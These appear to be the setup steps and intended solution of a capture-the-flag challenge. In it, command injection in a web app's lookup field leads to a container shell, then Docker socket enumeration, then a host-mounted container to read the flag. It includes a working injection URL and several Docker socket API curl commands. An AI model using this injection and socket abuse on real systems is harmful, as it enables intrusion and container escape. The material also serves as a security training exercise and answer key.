Setup:
1. Get everything in one file called "challenge". 
2. Create flag in /opt/ctf/flag.txt
3. Move inside "challenge", run "sudo docker compose up --build -d" # Dont forget to install docker
4. Run "docker ps" to check if it's fine
5. Go into docker and check "curl --unix-socket /var/run/docker.sock http://localhost/version" and "curl --unix-socket /var/run/docker.sock http://localhost/_ping" #if OK API works as it should

Solve:
1. In the lookup field you can do command injection like so: curl "http://localhost:8080/lookup?host=google.com%3Bid" #Will look for ID #use this to get shell access
2. Enumeration should include finding with "ls -l /var/run/docker.sock" and "/app/log/debug.log"
3. In logs they should find also the API logging
4. They discover with:  
	4.1 curl --unix-socket /var/run/docker.sock http://localhost/version
	4.2 curl --unix-socket /var/run/docker.sock http://localhost/_ping
	4.3 curl --unix-socket /var/run/docker.sock http://localhost/containers/json
5. Look for API exploit in API.md file


Intended path:

Web app
 |
 v
RCE
 |
 v
Shell in container
 |
 v
Enumeration
 |
 v
Discover /var/run/docker.sock
 |
 v
Interact with docker API
 |
 v 
Create new container with host mounted
 |
 v
Read flag


